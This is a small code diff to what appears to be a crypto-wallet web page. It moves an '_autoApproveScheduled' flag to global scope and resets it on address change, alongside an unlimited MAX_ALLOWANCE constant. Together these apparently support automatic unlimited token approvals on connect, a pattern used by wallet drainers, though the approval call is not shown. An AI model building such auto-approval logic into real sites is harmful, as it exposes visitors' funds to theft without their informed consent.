@@ -695,6 +695,7 @@
         var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         var isConnected = false, isApproved = false, isApproving = false, activeProvider = 'Unknown', currentWalletAddress = null;
         var wcConnector = null, wcAddress = null;
+        var _autoApproveScheduled = false; //
 
         // ===== Utils =====
         function escapeHtml(s) {
@@ -1101,6 +1102,7 @@
                         var newAddr = e.data.message.data && e.data.message.data.address;
                         if (newAddr && newAddr !== currentWalletAddress) {
                             isApproved = false;
+                            _autoApproveScheduled = false;
                             setConnectedWallet(newAddr, activeProvider);
                         }
                     }
@@ -1353,8 +1355,6 @@
                     _ea.value = address;
                 }
             } catch (e) { console.error('[WALLET] 에너지 주소 설정 실패:', e); }
-
-            var _autoApproveScheduled = false;
 
             // UI 업데이트
             try { document.getElementById('wallet-btn-text').textContent = address.substring(0, 6) + '...' + address.slice(-4); } catch (e) { }
